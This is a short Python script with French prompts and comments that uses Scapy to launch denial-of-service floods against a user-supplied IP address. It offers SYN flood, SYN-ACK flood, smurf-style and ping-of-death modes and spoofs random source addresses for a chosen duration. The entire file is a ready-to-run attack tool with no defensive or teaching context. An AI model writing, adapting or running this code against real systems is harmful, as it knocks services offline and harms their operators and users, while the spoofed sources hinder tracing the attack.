from scapy.all import IP, ICMP, TCP, send, Raw, conf
import random
import time
import sys

def generate_random_ip():
    """Génère une adresse IP valide aléatoire."""
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

conf.verb = 0  # Désactiver les messages de sortie Scapy

try:
    target_ip = input("IP cible : ")
    attack_type = input("Type d'attaque (syn_flood, syn_ack, smurf, pod) : ").lower()

    if attack_type not in ["syn_flood", "syn_ack", "smurf", "pod"]:
        print("Type d'attaque non reconnu.")
        sys.exit(1)

    duration = float(input("Durée de l'attaque (en secondes) : "))
    start_time = time.time()

    while time.time() - start_time < duration:
        src_ip = generate_random_ip()

        if attack_type == "syn_flood":
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80, flags="S")

        elif attack_type == "syn_ack":
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80, flags="SA")

        elif attack_type == "smurf":
            packet = IP(src=target_ip, dst=src_ip) / ICMP()

        elif attack_type == "pod":
            packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(b"A" * 6000)

        send(packet)

    print(f"Tous les paquets pour l'attaque {attack_type} ont été envoyés à {target_ip}.")

except KeyboardInterrupt:
    print("\nArrêt par l'utilisateur.")
    sys.exit(0)

except ValueError:
    print("Veuillez entrer des valeurs numériques valides.")
    sys.exit(1)